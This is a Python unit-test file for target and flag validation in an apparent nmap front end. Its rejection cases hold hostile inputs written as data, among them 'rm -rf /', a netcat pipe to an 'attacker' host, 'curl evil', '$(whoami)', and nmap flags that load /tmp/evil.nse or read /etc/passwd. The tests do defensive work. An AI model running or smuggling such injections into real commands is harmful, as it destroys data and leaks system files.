"""Unit tests for target/flag validation (no Qt needed)."""

import pytest

from core.validation import InvalidFlags, is_valid_target, sanitize_custom_flags


@pytest.mark.parametrize(
    "target",
    [
        "192.168.1.10",
        "10.0.0.0/24",
        "192.168.1.10-50",
        "scanme.nmap.org",
        "localhost",
        "fe80::1",
    ],
)
def test_valid_targets(target):
    assert is_valid_target(target)


@pytest.mark.parametrize(
    "target",
    [
        "",
        "   ",
        "--script=vulners",
        "192.168.1.1; rm -rf /",
        "192.168.1.1 | nc attacker 4444",
        "-oN /tmp/out",
        "192.168.1.1\n192.168.1.2",
        "`id`",
        "$(whoami)",
    ],
)
def test_invalid_targets(target):
    assert not is_valid_target(target)


def test_flags_empty():
    assert sanitize_custom_flags("") == []
    assert sanitize_custom_flags("   ") == []


def test_flags_normal():
    assert sanitize_custom_flags("-p 80,443 -T4") == ["-p", "80,443", "-T4"]


def test_flags_quoted():
    assert sanitize_custom_flags('-sV --script-args "a=b"') == [
        "-sV", "--script-args", "a=b"
    ]


@pytest.mark.parametrize(
    "flags",
    [
        "-oN /tmp/scan.txt",
        "-oX out.xml",
        "--script=/tmp/evil.nse",
        "--script-args-file=/tmp/args",
        "-iL /etc/passwd",
        "--datadir=/tmp",
        "-p 80; rm -rf ~",
        "-p 80 && curl evil",
        "$(id)",
        "`id`",
        "-p 80 > /tmp/x",
    ],
)
def test_flags_rejected(flags):
    with pytest.raises(InvalidFlags):
        sanitize_custom_flags(flags)


def test_flags_unbalanced_quotes():
    with pytest.raises(InvalidFlags):
        sanitize_custom_flags('-sV "unterminated')
